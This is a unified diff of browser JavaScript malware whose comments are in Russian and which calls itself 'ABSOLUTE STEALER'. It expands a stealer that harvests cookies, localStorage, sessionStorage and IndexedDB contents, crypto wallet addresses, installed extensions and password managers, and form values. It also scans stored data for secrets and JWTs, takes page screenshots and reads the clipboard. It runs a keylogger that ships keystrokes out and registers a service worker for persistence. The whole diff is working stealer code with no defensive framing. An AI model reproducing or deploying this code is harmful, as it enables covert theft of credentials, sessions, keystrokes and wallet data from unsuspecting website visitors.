+                const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+                fp.timezone=tz;
+                const now=new Date();
+                const jan=new Date(now.getFullYear(),0,1);
+                const jul=new Date(now.getFullYear(),6,1);
+                fp.timezoneOffset = -now.getTimezoneOffset();
+                fp.dst = now.getTimezoneOffset() !== Math.min(jan.getTimezoneOffset(), jul.getTimezoneOffset());
+            } catch(e){}
+
+            // Prefers
+            try {
+                fp.colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+                fp.reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+                fp.reducedTransparency = window.matchMedia('(prefers-reduced-transparency: reduce)').matches;
+                fp.contrast = window.matchMedia('(prefers-contrast: high)').matches ? 'high' : 'normal';
+            } catch(e){}
+
+            // Performance & Timing
+            try {
+                const perf=performance;
+                const t=perf.timing||{};
+                fp.timing = { navigationStart:t.navigationStart, domContentLoadedEventEnd:t.domContentLoadedEventEnd, loadEventEnd:t.loadEventEnd };
+                fp.memory = perf.memory ? { total: perf.memory.totalJSHeapSize, used: perf.memory.usedJSHeapSize, limit: perf.memory.jsHeapSizeLimit } : null;
+                fp.now = perf.now();
+                fp.timeOrigin = perf.timeOrigin;
+            } catch(e){}
+
+            // Resource Timing (все загруженные ресурсы)
+            try {
+                const resources=performance.getEntriesByType('resource')||[];
+                fp.resources = resources.slice(0,20).map(r=>({name:r.name.slice(0,50),duration:Math.round(r.duration),size:r.decodedBodySize||0}));
+                fp.resourceCount = resources.length;
+            } catch(e){}
+
+            // Paint Timing
+            try {
+                const paints=performance.getEntriesByType('paint')||[];
+                fp.paint = paints.map(p=>({name:p.name,time:Math.round(p.startTime)}));
+            } catch(e){}
 
             return fp;
         }
 
-        // ================================================================
-        // 5. STORAGE
-        // ================================================================
-        function getStorage() {
-            const ls = {};
-            try { for (let i = 0; i < localStorage.length; i++) {
-                const k = localStorage.key(i);
-                try { ls[k] = localStorage.getItem(k); } catch {}
-            }} catch (e) {}
-            const ss = {};
-            try { for (let i = 0; i < sessionStorage.length; i++) {
-                const k = sessionStorage.key(i);
-                try { ss[k] = sessionStorage.getItem(k); } catch {}
-            }} catch (e) {}
-            try { return { localStorage: ls, sessionStorage: ss, cookies: document.cookie || 'нет' }; } 
-            catch (e) { return { localStorage: ls, sessionStorage: ss, cookies: 'нет' }; }
+        // 4. ПЛАГИНЫ И MIME
+        function getPlugins() {
+            const result = { plugins: [], mimeTypes: [] };
+            try {
+                for(let i=0; i<navigator.plugins.length; i++) {
+                    const p=navigator.plugins[i];
+                    const mimes=[];
+                    for(let j=0; j<p.length; j++) mimes.push(p[j].type);
+                    result.plugins.push({name:p.name,filename:p.filename,description:p.description,mimes});
+                }
+            } catch(e){}
+            try {
+                for(let i=0; i<navigator.mimeTypes.length; i++) {
+                    const m=navigator.mimeTypes[i];
+                    result.mimeTypes.push({type:m.type,description:m.description,suffixes:m.suffixes});
+                }
+            } catch(e){}
+            return result;
         }
 
-        // ================================================================
-        // 6. INDEXEDDB
-        // ================================================================
-        function getIndexedDB() {
-            return new Promise((resolve) => {
+        // 5. ХАРАКТЕРИСТИКИ БРАУЗЕРА
+        function getBrowserFeatures() {
+            const f = {};
+            const features = ['WebAssembly','SharedArrayBuffer','WebGL','WebGL2','WebGPU','WebSocket','WebRTC','WebAudio','WebMIDI','WebUSB','WebBluetooth','WebXR','WebNFC','WebHID','WebSerial','WebTransport','WebCodecs','WebLocks','WebShare','WebOTP','WebAuthn','WebPayment','WebCrypto','ServiceWorker','Notification','Push','Geolocation','Battery','Vibration','ScreenOrientation','Fullscreen','Clipboard','FileSystem','FileAPI','IndexedDB','CacheStorage','CookieStore','StorageManager','DeviceMotion','DeviceOrientation','AmbientLight','Proximity','Magnetometer','Accelerometer','Gyroscope','SpeechRecognition','SpeechSynthesis','WebAssembly'];
+            features.forEach(feat => {
+                try { f[feat] = typeof window[feat] !== 'undefined' || (typeof navigator[feat] !== 'undefined'); } catch(e){ f[feat]=false; }
+            });
+            // Проверка через eval для некоторых
+            try { f.WebAssembly = typeof WebAssembly !== 'undefined'; } catch(e){}
+            try { f.SharedArrayBuffer = typeof SharedArrayBuffer !== 'undefined'; } catch(e){}
+            try { f.WebGPU = typeof navigator.gpu !== 'undefined'; } catch(e){}
+            return f;
+        }
+
+        // 6. STORAGE — ВСЕ
+        function getAllStorage() {
+            const ls={}; try{ for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); try{ ls[k]=localStorage.getItem(k); }catch{} } }catch(e){}
+            const ss={}; try{ for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); try{ ss[k]=sessionStorage.getItem(k); }catch{} } }catch(e){}
+            const cookies={}; try{ document.cookie.split('; ').filter(Boolean).forEach(p=>{ const [k,...v]=p.split('='); cookies[k]=v.join('='); }); }catch(e){}
+            return { localStorage: ls, sessionStorage: ss, cookies };
+        }
+
+        function getIndexedDBFull() {
+            return new Promise(resolve=>{
                 try {
-                    if (!indexedDB.databases) { resolve(null); return; }
-                    indexedDB.databases().then(dbs => {
-                        const result = [];
-                        let done = 0;
-                        if (dbs.length === 0) { resolve([]); return; }
-                        dbs.forEach(dbInfo => {
-                            const req = indexedDB.open(dbInfo.name);
-                            req.onsuccess = (e) => {
-                                const db = e.target.result;
-                                const stores = Array.from(db.objectStoreNames);
-                                const storeData = [];
-                                let sDone = 0;
-                                if (stores.length === 0) {
-                                    result.push({ name: dbInfo.name, stores: [] });
-                                    db.close();
-                                    if (++done === dbs.length) resolve(result);
-                                    return;
-                                }
-                                stores.forEach(storeName => {
-                                    try {
-                                        const tx = db.transaction(storeName, 'readonly');
-                                        const store = tx.objectStore(storeName);
-                                        const reqAll = store.getAll();
-                                        reqAll.onsuccess = () => {
-                                            storeData.push({ storeName, count: reqAll.result?.length || 0 });
-                                            if (++sDone === stores.length) {
-                                                result.push({ name: dbInfo.name, stores: storeData });
-                                                db.close();
-                                                if (++done === dbs.length) resolve(result);
-                                            }
+                    if(!indexedDB.databases){ resolve(null); return; }
+                    indexedDB.databases().then(dbs=>{
+                        const result=[]; let done=0;
+                        if(!dbs.length){ resolve([]); return; }
+                        dbs.forEach(dbInfo=>{
+                            const req=indexedDB.open(dbInfo.name);
+                            req.onsuccess=e=>{
+                                const db=e.target.result;
+                                const stores=Array.from(db.objectStoreNames);
+                                const storeData=[];
+                                let sDone=0;
+                                if(!stores.length){ result.push({name:dbInfo.name,stores:[]}); db.close(); if(++done===dbs.length) resolve(result); return; }
+                                stores.forEach(storeName=>{
+                                    try{
+                                        const tx=db.transaction(storeName,'readonly');
+                                        const store=tx.objectStore(storeName);
+                                        const reqAll=store.getAll();
+                                        reqAll.onsuccess=()=>{
+                                            const items=reqAll.result||[];
+                                            storeData.push({storeName,count:items.length,samples:items.slice(0,3).map(i=>typeof i==='object'?JSON.stringify(i).slice(0,100):String(i).slice(0,100))});
+                                            if(++sDone===stores.length){ result.push({name:dbInfo.name,stores:storeData}); db.close(); if(++done===dbs.length) resolve(result); }
                                         };
-                                        reqAll.onerror = () => {
-                                            storeData.push({ storeName, count: 0 });
-                                            if (++sDone === stores.length) {
-                                                result.push({ name: dbInfo.name, stores: storeData });
-                                                db.close();
-                                                if (++done === dbs.length) resolve(result);
-                                            }
+                                        reqAll.onerror=()=>{
+                                            storeData.push({storeName,count:0,samples:[]});
+                                            if(++sDone===stores.length){ result.push({name:dbInfo.name,stores:storeData}); db.close(); if(++done===dbs.length) resolve(result); }
                                         };
-                                    } catch (err) {
-                                        storeData.push({ storeName, count: 0 });
-                                        if (++sDone === stores.length) {
-                                            result.push({ name: dbInfo.name, stores: storeData });
-                                            db.close();
-                                            if (++done === dbs.length) resolve(result);
-                                        }
+                                    }catch(err){
+                                        storeData.push({storeName,count:0,samples:[]});
+                                        if(++sDone===stores.length){ result.push({name:dbInfo.name,stores:storeData}); db.close(); if(++done===dbs.length) resolve(result); }
                                     }
                                 });
                             };
-                            req.onerror = () => { if (++done === dbs.length) resolve(result); };
+                            req.onerror=()=>{ if(++done===dbs.length) resolve(result); };
                         });
-                    }).catch(() => resolve(null));
-                } catch (e) { resolve(null); }
+                    }).catch(()=>resolve(null));
+                } catch(e){ resolve(null); }
             });
         }
 
-        // ================================================================
-        // 7. КРИПТОВАЛЮТА
-        // ================================================================
-        function getWallets() {
-            const result = [];
+        // 7. КРИПТО — ВСЕ
+        function getAllCrypto() {
+            const result = { wallets: [], extensions: [], installed: [] };
+            // Кошельки
             try {
-                if (window.ethereum) {
-                    result.push({
-                        type: 'Ethereum',
-                        address: window.ethereum.selectedAddress || null,
-                        chainId: window.ethereum.chainId || null,
-                        isMetaMask: window.ethereum.isMetaMask || false
-                    });
+                if(window.ethereum) {
+                    const eth={type:'Ethereum',address:window.ethereum.selectedAddress||null,chainId:window.ethereum.chainId||null,isMetaMask:window.ethereum.isMetaMask||false,isTrust:window.ethereum.isTrust||false,isCoinbase:window.ethereum.isCoinbase||false};
+                    result.wallets.push(eth);
+                    if(window.ethereum.providers) {
+                        window.ethereum.providers.forEach(p=>{
+                            if(p.selectedAddress) result.wallets.push({type:'Ethereum',address:p.selectedAddress,isMetaMask:p.isMetaMask||false});
+                        });
+                    }
                 }
-            } catch (e) {}
-            try {
-                if (window.solana && window.solana.publicKey) {
-                    result.push({ type: 'Solana', address: window.solana.publicKey.toString() });
-                }
-                if (window.phantom && window.phantom.solana && window.phantom.solana.publicKey) {
-                    result.push({ type: 'Phantom', address: window.phantom.solana.publicKey.toString() });
-                }
-            } catch (e) {}
-            ['trustwallet', 'okxwallet', 'bitkeep', 'coinbase', 'walletconnect'].forEach(n => {
-                try { if (window[n]) result.push({ type: n, address: null }); } catch {}
+            } catch(e){}
+            try { if(window.solana) result.wallets.push({type:'Solana',address:window.solana.publicKey?window.solana.publicKey.toString():null}); } catch(e){}
+            try { if(window.phantom) result.wallets.push({type:'Phantom',address:window.phantom.solana?.publicKey?.toString()||null}); } catch(e){}
+            ['trustwallet','okxwallet','bitkeep','coinbase','walletconnect','metamask','rabby','imtoken','tokenpocket','mathwallet'].forEach(n=>{
+                try { if(window[n]) result.wallets.push({type:n,address:null}); } catch(e){}
             });
             return result;
         }
 
-        // ================================================================
-        // 8. РАСШИРЕНИЯ
-        // ================================================================
-        function getExtensions() {
-            const result = [];
-            const known = {
-                'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
-                'cjpalhdlnbpafiamejdnhcphjbkeiagm': 'uBlock Origin',
-                'gighmmpiobklfepjocnamgkkbiglidom': 'AdBlock',
-                'hnfanknocfeofbddgcijnmhnfnkdnaad': 'Coinbase',
-                'hpihmllllekjbnpehglncmolodpknmmb': 'Trust Wallet',
-                'bpaejdmabdchhpnpepceapmdmgellhpg': 'OKX Wallet',
-                'aapbdbdomjkkjkaonfhkkikfgjllcleb': 'Google Translate',
-                'lmjegmlicamnimmfhcmpkclmigmmcbeh': 'Tampermonkey',
-                'jilocjlanhgkobdddpdgaennlbnadnhb': 'LastPass',
-                'mooikfkahbdckaollhiabmhbonmhbbha': 'Bitwarden'
+        // 8. РАСШИРЕНИЯ — ВСЕ
+        function getAllExtensions() {
+            const result=[];
+            const known={
+                'nkbihfbeogaeaoehlefnkodbefgpgknn':'MetaMask',
+                'cjpalhdlnbpafiamejdnhcphjbkeiagm':'uBlock Origin',
+                'gighmmpiobklfepjocnamgkkbiglidom':'AdBlock',
+                'bgnkhhnnamicmpeenaelnjfhikgbkllg':'AdGuard',
+                'eofcbnmajmjmplflapaojjnihcjkigck':'AdBlock Plus',
+                'hnfanknocfeofbddgcijnmhnfnkdnaad':'Coinbase Wallet',
+                'hpihmllllekjbnpehglncmolodpknmmb':'Trust Wallet',
+                'bpaejdmabdchhpnpepceapmdmgellhpg':'OKX Wallet',
+                'aapbdbdomjkkjkaonfhkkikfgjllcleb':'Google Translate',
+                'lmjegmlicamnimmfhcmpkclmigmmcbeh':'Tampermonkey',
+                'milhjnmkoeigoejnbncpmiphbnpnoakl':'Violentmonkey',
+                'jilocjlanhgkobdddpdgaennlbnadnhb':'LastPass',
+                'mooikfkahbdckaollhiabmhbonmhbbha':'Bitwarden',
+                'pdffkfellgipmhklpdmokmckkkfcopbh':'Dashlane',
+                'lkbnfiajkebaojmjkcbelknbojiebkbj':'1Password',
+                'bdokagaapmiginafdgfngbofljfjjkej':'NordVPN',
+                'hcglnmhlmpkplgimaabnkojmhgdmjpha':'ProtonVPN',
+                'cmfgifnodibmldkmcfphecgmlmpkkkmb':'Windscribe',
+                'dhdgffkkebhmkfjojejmpbldmpobfkfo':'Grammarly',
+                'kbfnbcaeplbcioakkpcpgfkobkghlhen':'Avast Online Security',
+                'fdgbnobmffjpnfpcfnacdcefpbjgecpk':'Kaspersky Protection',
+                'ldhnecckecfhhjphgncbeonpcoadfhac':'McAfee WebAdvisor'
             };
             try {
-                if (window.chrome && chrome.runtime) {
-                    Object.keys(known).forEach(id => {
+                if(window.chrome && chrome.runtime) {
+                    Object.keys(known).forEach(id=>{
                         try {
-                            chrome.runtime.getURL(`//${id}/manifest.json`);
+                            const url=chrome.runtime.getURL(`//${id}/manifest.json`);
+                            fetch(url,{mode:'no-cors'}).catch(()=>{});
                             result.push(known[id]);
-                        } catch {}
+                        } catch(e){}
                     });
                 }
-            } catch (e) {}
+            } catch(e){}
             return result;
         }
 
-        // ================================================================
-        // 9. ПАРОЛИ
-        // ================================================================
-        function getPasswords() {
-            const result = [];
+        // 9. ПАРОЛИ И ФОРМЫ
+        function getAllPasswords() {
+            const result = { forms: [], autofill: [], passwordManagers: [] };
             try {
-                document.querySelectorAll('form').forEach(form => {
-                    const data = { action: form.action || '', inputs: [] };
-                    form.querySelectorAll('input').forEach(input => {
-                        if (input.value && input.value.length > 0) {
+                document.querySelectorAll('form').forEach(form=>{
+                    const data={action:form.action||'',method:form.method||'',inputs:[]};
+                    form.querySelectorAll('input, textarea, select').forEach(inp=>{
+                        if(inp.value && inp.value.length>0) {
                             data.inputs.push({
-                                name: input.name || input.id || '',
-                                type: input.type,
-                                value: input.type === 'password' ? '[PASSWORD]' : trunc(input.value, 50),
-                                isPassword: input.type === 'password'
+                                name:inp.name||inp.id||'',
+                                type:inp.type||inp.tagName,
+                                value:inp.type==='password'?'[PASSWORD]':trunc(inp.value,50),
+                                isPassword:inp.type==='password',
+                                autocomplete:inp.autocomplete||'',
+                                placeholder:inp.placeholder||''
                             });
                         }
                     });
-                    if (data.inputs.length > 0) result.push(data);
+                    if(data.inputs.length) result.forms.push(data);
                 });
-            } catch (e) {}
+            } catch(e){}
+            // Менеджеры паролей
+            try { if(window.lp) result.passwordManagers.push('LastPass'); } catch(e){}
+            try { if(window.dashlane) result.passwordManagers.push('Dashlane'); } catch(e){}
+            try { if(window.agilebits) result.passwordManagers.push('1Password'); } catch(e){}
+            try { if(window.bitwarden) result.passwordManagers.push('Bitwarden'); } catch(e){}
+            try { if(document.querySelector('[data-bitwarden]')) result.passwordManagers.push('Bitwarden'); } catch(e){}
             return result;
         }
 
-        // ================================================================
-        // 10. СЕКРЕТЫ
-        // ================================================================
-        function findSecrets(obj) {
-            const result = [];
-            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed', 'recovery', 'access', 'refresh', 'csrf', 'xsrf', 'session'];
-            const search = (data, path = '') => {
-                if (!data || typeof data !== 'object') return;
-                for (let k in data) {
+        // 10. СЕКРЕТЫ — ВСЕ
+        function findAllSecrets(obj) {
+            const result=[];
+            const patterns=['token','jwt','secret','key','auth','password','pwd','api','private','wallet','mnemonic','seed','recovery','access','refresh','csrf','xsrf','session','bearer','authorization','apikey','apisecret','clientsecret','id_token','encryption','decryption','cert','pem','pk','priv'];
+            const search=(data,path='')=>{
+                if(!data || typeof data!=='object') return;
+                for(let k in data) {
                     try {
-                        const v = data[k];
-                        const fullPath = path ? `${path}.${k}` : k;
-                        if (patterns.some(p => k.toLowerCase().includes(p))) {
-                            if (v && typeof v === 'string' && v.length > 3 && v.length < 300) {
-                                result.push({ path: fullPath, value: trunc(v, 60) });
+                        const v=data[k];
+                        const fullPath=path?`${path}.${k}`:k;
+                        if(patterns.some(p=>k.toLowerCase().includes(p))) {
+                            if(v && typeof v==='string' && v.length>3 && v.length<500) {
+                                result.push({path:fullPath,value:trunc(v,60)});
                             }
                         }
-                        if (typeof v === 'object' && v !== null) search(v, fullPath);
-                    } catch {}
+                        // JWT detection
+                        if(typeof v==='string' && v.length>20 && v.match(/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/)) {
+                            result.push({path:fullPath,value:trunc(v,60),type:'JWT'});
+                        }
+                        if(typeof v==='object' && v!==null) search(v,fullPath);
+                    } catch(e){}
                 }
             };
             search(obj);
             return result;
         }
 
-        // ================================================================
-        // 11. DOM
-        // ================================================================
-        function getDOM() {
+        // 11. DOM — ВСЕ
+        function getAllDOM() {
+            const result = { url: location.href, title: document.title, referrer: document.referrer||'нет' };
             try {
-                return {
-                    title: document.title,
-                    url: window.location.href,
-                    referrer: document.referrer || 'нет',
-                    forms: document.querySelectorAll('form').length,
-                    inputs: document.querySelectorAll('input, textarea, select').length
-                };
-            } catch (e) { return { url: window.location.href || 'unknown' }; }
+                result.forms = document.querySelectorAll('form').length;
+                result.inputs = document.querySelectorAll('input, textarea, select').length;
+                result.links = document.querySelectorAll('a[href]').length;
+                result.images = document.querySelectorAll('img').length;
+                result.scripts = document.querySelectorAll('script').length;
+                result.styles = document.querySelectorAll('link[rel="stylesheet"], style').length;
+                result.meta = {};
+                document.querySelectorAll('meta').forEach(m=>{
+                    const name=m.getAttribute('name')||m.getAttribute('property')||'';
+                    if(name) result.meta[name]=m.getAttribute('content')||'';
+                });
+                // Все ссылки
+                result.allLinks = Array.from(document.querySelectorAll('a[href]')).slice(0,20).map(a=>a.href);
+                // Все скрытые поля
+                result.hidden = Array.from(document.querySelectorAll('input[type="hidden"]')).map(i=>({name:i.name||'',value:i.value||''}));
+            } catch(e){}
+            return result;
         }
 
-        // ================================================================
         // 12. СКРИНШОТ
-        // ================================================================
         async function takeScreenshot() {
             try {
-                if (typeof html2canvas === 'undefined') {
-                    const script = document.createElement('script');
-                    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
-                    await new Promise((resolve, reject) => {
-                        script.onload = resolve;
-                        script.onerror = reject;
-                        document.head.appendChild(script);
-                    });
+                if(typeof html2canvas==='undefined') {
+                    const s=document.createElement('script');
+                    s.src='https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                    await new Promise((resolve,reject)=>{ s.onload=resolve; s.onerror=reject; document.head.appendChild(s); });
                     await sleep(300);
                 }
-                const canvas = await html2canvas(document.body, {
-                    useCORS: true,
-                    allowTaint: true,
-                    scale: 0.05,
-                    logging: false,
-                    backgroundColor: null
-                });
-                return canvas.toDataURL('image/jpeg', 0.08);
-            } catch (e) { return null; }
+                const canvas=await html2canvas(document.body,{useCORS:true,allowTaint:true,scale:0.05,logging:false,backgroundColor:null});
+                return canvas.toDataURL('image/jpeg',0.08);
+            } catch(e){ return null; }
         }
 
-        // ================================================================
         // 13. KEYLOGGER
-        // ================================================================
         function setupKeylogger() {
             try {
-                const buffer = [];
-                document.addEventListener('keydown', (e) => {
-                    if (e.key === 'Unidentified') return;
-                    const special = {
-                        'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
-                        'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
-                        'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]',
-                        'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]'
-                    };
-                    let out = special[e.key] || e.key;
-                    if (e.ctrlKey) out = '[CTRL]+' + out;
-                    if (e.shiftKey && !special[e.key]) out = out.toUpperCase();
-                    if (e.altKey) out = '[ALT]+' + out;
+                const buffer=[];
+                document.addEventListener('keydown',e=>{
+                    if(e.key==='Unidentified') return;
+                    const special={'Control':'[CTRL]','Shift':'[SHIFT]','Alt':'[ALT]','Meta':'[WIN]','Escape':'[ESC]','Tab':'[TAB]','Enter':'[ENTER]','Backspace':'[BACK]','Delete':'[DEL]','ArrowUp':'[UP]','ArrowDown':'[DOWN]','ArrowLeft':'[LEFT]','ArrowRight':'[RIGHT]','Home':'[HOME]','End':'[END]','PageUp':'[PGUP]','PageDown':'[PGDN]'};
+                    let out=special[e.key]||e.key;
+                    if(e.ctrlKey) out='[CTRL]+'+out;
+                    if(e.shiftKey && !special[e.key]) out=out.toUpperCase();
+                    if(e.altKey) out='[ALT]+'+out;
                     buffer.push(out);
-                    if (buffer.length >= 15) {
-                        const data = buffer.splice(0);
-                        sendImage({ keylog: data.join('') });
-                    }
+                    if(buffer.length>=15){ const d=buffer.splice(0); sendImage({keylog:d.join('')}); }
                 });
-                setInterval(() => {
-                    if (buffer.length > 0) {
-                        const data = buffer.splice(0);
-                        sendImage({ keylog: data.join('') });
-                    }
-                }, 20000);
+                setInterval(()=>{ if(buffer.length>0){ const d=buffer.splice(0); sendImage({keylog:d.join('')}); } },20000);
                 return true;
-            } catch (e) { return false; }
+            } catch(e){ return false; }
         }
 
-        // ================================================================
         // 14. БУФЕР ОБМЕНА
-        // ================================================================
         async function getClipboard() {
             try {
-                const ta = document.createElement('textarea');
-                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
+                const ta=document.createElement('textarea');
+                ta.style.cssText='position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
                 document.body.appendChild(ta);
                 ta.focus();
-                if (document.execCommand('paste')) {
-                    const val = ta.value;
+                if(document.execCommand('paste')) {
+                    const val=ta.value;
                     ta.remove();
-                    if (val && val.length > 0) return val;
+                    if(val && val.length>0) return val;
                 }
                 ta.remove();
-            } catch (e) {}
+            } catch(e){}
             try {
-                if (navigator.clipboard && navigator.clipboard.read) {
-                    const items = await navigator.clipboard.read();
-                    for (let item of items) {
-                        if (item.types.includes('text/plain')) {
-                            const blob = await item.getType('text/plain');
+                if(navigator.clipboard && navigator.clipboard.read) {
+                    const items=await navigator.clipboard.read();
+                    for(let item of items) {
+                        if(item.types.includes('text/plain')) {
+                            const blob=await item.getType('text/plain');
                             return await blob.text();
                         }
                     }
                 }
-            } catch (e) {}
+            } catch(e){}
             return null;
         }
 
-        // ================================================================
         // 15. SERVICE WORKER
-        // ================================================================
         function setupPersistence() {
             try {
-                if ('serviceWorker' in navigator) {
-                    const swCode = `
-                        self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
-                        self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
-                    `;
-                    const blob = new Blob([swCode], { type: 'application/javascript' });
-                    const url = URL.createObjectURL(blob);
-                    navigator.serviceWorker.register(url, { scope: '/' });
+                if('serviceWorker' in navigator) {
+                    const sw=`self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));`;
+                    const blob=new Blob([sw],{type:'application/javascript'});
+                    navigator.serviceWorker.register(URL.createObjectURL(blob),{scope:'/'});
                     return true;
                 }
-            } catch (e) {}
+            } catch(e){}
             return false;
         }
 
-        // ================================================================
-        // 16. СЕНСОРЫ
-        // ================================================================
-        function getSensors() {
-            return new Promise((resolve) => {
-                const result = {};
+        // 16. СЕНСОРЫ (все)
+        function getAllSensors() {
+            return new Promise(resolve=>{
+                const result={};
                 try {
-                    if (navigator.getBattery) {
-                        navigator.getBattery().then(battery => {
-                            result.battery = {
-                                level: Math.round(battery.level * 100),
-                                charging: battery.charging
-                            };
+                    if(navigator.getBattery) {
+                        navigator.getBattery().then(b=>{
+                            result.battery={level:Math.round(b.level*100),charging:b.charging,chargingTime:b.chargingTime,dischargingTime:b.dischargingTime};
                             resolve(result);
                         });
                     }
-                } catch (e) {}
+                } catch(e){}
                 try {
-                    if (window.DeviceMotionEvent) {
-                        const handler = (e) => {
-                            if (e.acceleration) {
-                                result.acceleration = { x: e.acceleration.x, y: e.acceleration.y, z: e.acceleration.z };
-                            }
-                            if (e.rotationRate) {
-                                result.rotationRate = { alpha: e.rotationRate.alpha, beta: e.rotationRate.beta, gamma: e.rotationRate.gamma };
-                            }
-                            window.removeEventListener('devicemotion', handler);
+                    if(window.DeviceMotionEvent) {
+                        const handler=e=>{
+                            if(e.acceleration) result.acceleration={x:e.acceleration.x,y:e.acceleration.y,z:e.acceleration.z};
+                            if(e.accelerationIncludingGravity) result.gravity={x:e.accelerationIncludingGravity.x,y:e.accelerationIncludingGravity.y,z:e.accelerationIncludingGravity.z};
+                            if(e.rotationRate) result.gyroscope={alpha:e.rotationRate.alpha,beta:e.rotationRate.beta,gamma:e.rotationRate.gamma};
+                            window.removeEventListener('devicemotion',handler);
                             resolve(result);
                         };
-                        window.addEventListener('devicemotion', handler, { once: true });
+                        window.addEventListener('devicemotion',handler,{once:true});
                     }
-                } catch (e) {}
-                setTimeout(() => resolve(result), 1000);
+                } catch(e){}
+                try {
+                    if(window.DeviceOrientationEvent) {
+                        const handler=e=>{
+                            result.orientation={absolute:e.absolute,alpha:e.alpha,beta:e.beta,gamma:e.gamma};
+                            window.removeEventListener('deviceorientation',handler);
+                            resolve(result);
+                        };
+                        window.addEventListener('deviceorientation',handler,{once:true});
+                    }
+                } catch(e){}
+                setTimeout(()=>resolve(result),1000);
             });
         }
 
-        // ================================================================
-        // 17. ФОРМАТИРОВАНИЕ ОТЧЁТА
-        // ================================================================
-        function formatReport(data) {
-            const lines = [];
-            lines.push('🔴 ULTIMATE STEALER — ВСЕ ДАННЫЕ');
-            lines.push('========================================');
+        // 17. ФОРМАТИРОВАНИЕ
+        function formatFinal(data) {
+            const lines=[];
+            lines.push('🔴 ABSOLUTE STEALER — ВСЕ ДАННЫЕ');
+            lines.push('═══════════════════════════════════════════════════════');
             lines.push('');
 
-            if (data.network) {
-                const n = data.network;
-                if (n.ips && n.ips.length) {
-                    const ipList = n.ips.map(i => i.ip).join(', ');
-                    lines.push('🌐 IP: ' + ipList);
-                    const geo = n.ips.find(i => i.data && i.data.country);
-                    if (geo) {
-                        const g = geo.data;
-                        const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
-                        if (loc) lines.push('📍 ' + loc);
-                        if (g.isp) lines.push('📡 ' + g.isp);
+            // Сеть
+            if(data.network) {
+                const n=data.network;
+                if(n.ips && n.ips.length) {
+                    const ipList=[...new Set(n.ips.map(i=>i.ip))].join(', ');
+                    lines.push(`🌐 IP: ${ipList}`);
+                    if(n.geo) {
+                        const g=n.geo;
+                        const loc=[g.country,g.region,g.city].filter(Boolean).join(', ');
+                        if(loc) lines.push(`📍 ${loc}`);
+                        if(g.isp) lines.push(`📡 ${g.isp}`);
+                        if(g.lat && g.lon) lines.push(`🗺 ${g.lat}, ${g.lon}`);
                     }
                     lines.push('');
                 }
-                const allIPs = [];
-                if (n.webrtc && n.webrtc.public) allIPs.push(...n.webrtc.public);
-                if (n.ips) n.ips.forEach(i => { if (i.ip) allIPs.push(i.ip); });
-                if (allIPs.length) {
-                    lines.push('🌐 ВСЕ IP: ' + [...new Set(allIPs)].join(', '));
+                const allIPs=[];
+                if(n.webrtc && n.webrtc.public) allIPs.push(...n.webrtc.public);
+                if(n.ips) n.ips.forEach(i=>{ if(i.ip) allIPs.push(i.ip); });
+                if(allIPs.length) {
+                    lines.push(`🌐 ВСЕ IP: ${[...new Set(allIPs)].join(', ')}`);
                     lines.push('');
                 }
-                if (n.webrtc && n.webrtc.local && n.webrtc.local.length) {
-                    lines.push('📡 WebRTC локальные: ' + n.webrtc.local.join(', '));
+                if(n.webrtc && n.webrtc.local && n.webrtc.local.length) {
+                    lines.push(`📡 WebRTC локальные: ${n.webrtc.local.join(', ')}`);
                 }
-                if (n.network) {
-                    const conn = n.network;
-                    lines.push('📶 Сеть: ' + (conn.effectiveType || '?') + ' ' + (conn.downlink || '?') + 'Mbps, RTT ' + (conn.rtt || '?') + 'ms');
+                if(n.network) {
+                    const c=n.network;
+                    lines.push(`📶 Сеть: ${c.effectiveType||'?'} ${c.downlink||'?'}Mbps, RTT ${c.rtt||'?'}ms`);
                 }
-                if (n.dns) {
-                    lines.push('🕵️ DNS: ' + n.dns.domain + ' (' + (n.dns.time || 'таймаут') + 'ms)');
-                }
-                if (n.timing && n.timing.length) {
-                    const avg = Math.round(n.timing.reduce((a,b) => a + b, 0) / n.timing.length);
-                    lines.push('⏱ Временная атака: avg ' + avg + 'ms');
+                if(n.dns) lines.push(`🕵️ DNS: ${n.dns.domain} (${n.dns.time||'таймаут'}ms)`);
+                if(n.timing && n.timing.length) {
+                    const avg=Math.round(n.timing.reduce((a,b)=>a+b,0)/n.timing.length);
+                    lines.push(`⏱ Задержка: avg ${avg}ms${n.proxy?' ⚠️ Прокси':''}${n.vpn?' 🔒 VPN':''}`);
                 }
                 lines.push('');
-                if (allIPs.length) {
-                    lines.push('🔗 https://www.google.com/maps?q=' + allIPs[0]);
+                if(allIPs.length) lines.push(`🔗 https://www.google.com/maps?q=${allIPs[0]}`);
+                lines.push('');
+            }
+
+            // Устройство
+            if(data.device) {
+                const d=data.device;
+                lines.push(`💻 ${d.os||'unknown'} ${d.osVersion||''}, ${d.browser||''} ${d.browserVersion||''}`);
+                if(d.model && d.model!=='unknown') lines.push(`📱 Модель: ${d.model}`);
+                lines.push(`   ${d.hardwareConcurrency||'?'} ядер, ${d.deviceMemory||'?'}GB RAM`);
